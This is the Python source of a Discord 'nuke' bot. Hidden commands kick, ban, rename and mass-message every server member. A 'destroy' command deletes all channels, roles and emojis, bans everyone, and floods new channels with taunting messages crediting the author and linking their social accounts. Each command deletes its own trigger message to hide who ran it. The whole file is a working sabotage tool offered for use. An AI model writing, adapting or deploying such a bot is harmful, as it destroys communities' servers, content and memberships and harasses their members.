# tyrone is So Cute
from config import prefix
from config import token
import keep_alive
import discord
from discord.ext import commands
from discord.ext.commands import bot
import asyncio
import time
import random
import os
intents = discord.Intents(messages=True, guilds=True, members=True)
# Imports the needed libs.

client = commands.Bot(command_prefix=prefix, intents=intents)
# Sets prefix and intents

client.remove_command("help")

@client.event
async def on_ready():
    print ("skid works")

@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))

####HELP COMMAND####
@client.command(pass_context=True)
async def secret(ctx):
    await ctx.message.delete()
    member = ctx.message.author

    embed = discord.Embed(
        colour = discord.Colour.blue()
    )

    embed.set_author(name='Secret')
    embed.add_field(name='Kall', value='Kicks every member in a server', inline=False)
    embed.add_field(name='Ball', value='Bans every member in a server', inline=False)
    embed.add_field(name='Rall', value='Renames every member in a server', inline=False)
    embed.add_field(name='Mall', value='Messages every member in a server', inline=False)
    embed.add_field(name='Destroy', value='Deleted channels, remakes new ones, deletes roles, bans members, and wipes emojis. In that order', inline=False)
    embed.add_field(name='Ping', value='Gives ping to client (expressed in MS)', inline=False)
    embed.add_field(name='Info', value='Gives information of a user', inline=False)
    await member.send(embed=embed)
#############################

####KALL COMMAND####
@client.command(pass_context=True)
async def kall(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.kick(member)
            print (f"{member.name} has been kicked")
        except:
            print (f"{member.name} has FAILED to be kicked")
        print ("Action completed: Kick all")
#############################

####BALL COMMAND####
@client.command(pass_context=True)
async def ball(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    print ("Action completed: Ban all")
#############################

####RALL COMMAND####
@client.command(pass_context=True)

async def rall(ctx, rename_to):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print (f"{member.name} has been renamed to {rename_to}")
        except:
            print (f"{member.name} has NOT been renamed")
        print("Action completed: Rename all")
#############################

####MALL COMMAND####
@client.command(pass_context=True)
async def mall(ctx):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        await asyncio.sleep(0)
        try:
            embed = discord.Embed(title="Enjoy Your Nuke :)", url="https://media.tenor.com/images/541ce9dea44e56688f6f816b1d9e7b33/tenor.gif", description="Nuke Made By 2DS#3141" , color=discord.Colour.purple())
            embed.add_field(
                name="⠀",
                value=
                "[Twitch](https://www.twitch.tv/whois2ds)",
                inline=False)
            embed.add_field(
                name="⠀",
                value=
                "[Youtube](https://www.youtube.com/channel/UC43dWa6HMpHUuJ9bSkbs9TQ)",
                inline=False)
            embed.add_field(
                name="⠀",
                value=
                "[Instagram](https://www.instagram.com/numbmike/)",
                inline=False)
            embed.set_thumbnail(url="https://media.tenor.com/images/541ce9dea44e56688f6f816b1d9e7b33/tenor.gif")
            embed.set_footer(text="Nuked By 2DS's Bot! Sorry About Your Loss")
            await member.send(embed=embed)
        except:
            pass
        print("Action completed: Message all")
#############################

###DESTROY COMMAND####
@client.command(pass_context=True)
async def destroy(ctx):
    await ctx.message.delete()
    for member in list(client.get_all_members()): 
        await asyncio.sleep(0)
        try:
            embed = discord.Embed(title="Enjoy Your Nuke :)", url="https://media.tenor.com/images/541ce9dea44e56688f6f816b1d9e7b33/tenor.gif", description="Nuke Made By 2DS#3141" , color=discord.Colour.purple())
            embed.add_field(
                name="⠀",
                value=
                "[Twitch](https://www.twitch.tv/whois2ds)",
                inline=False)
            embed.add_field(
                name="⠀",
                value=
                "[Youtube](https://www.youtube.com/channel/UC43dWa6HMpHUuJ9bSkbs9TQ)",
                inline=False)
            embed.add_field(
                name="⠀",
                value=
                "[Instagram](https://instagram.com/numbmike)",
                inline=False)
            embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
            embed.set_footer(text="Nuked By 2D's Bot! Sorry About Your Loss")
            await member.send(embed=embed)
        except:
            pass
        print("Action completed: Message all")
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print (channel.name + " has been deleted")
        except:
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("Nuked By 2DS🤡")
        await channel.send(" @everyone 2D On Top Rip Bozo")
        await channel.send(embed=embed)
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted")
        except:
            pass
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted")
        except:
            pass    
    print("Action completed: Nuclear Destruction")
#############################


####PING COMMAND####
@client.command(pass_context=True)
async def ping(ctx):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    t1 = time.perf_counter()
    await channel.trigger_typing()
    t2 = time.perf_counter()
    embed=discord.Embed(title=None, description='Ping: {}'.format(round((t2-t1)*1000)), color=0x2874A6)
    await member.send(embed=embed)
    print("Action completed: Server ping")
#############################

####INFO COMMAND####
@client.command(pass_context=True)
async def info(ctx, member: discord.Member=None):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    if member is None:
        pass
    else:
        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))
    print("Action completed: User Info")
#############################


keep_alive.keep_alive()


client.run(token)
# Place your Bot's token here
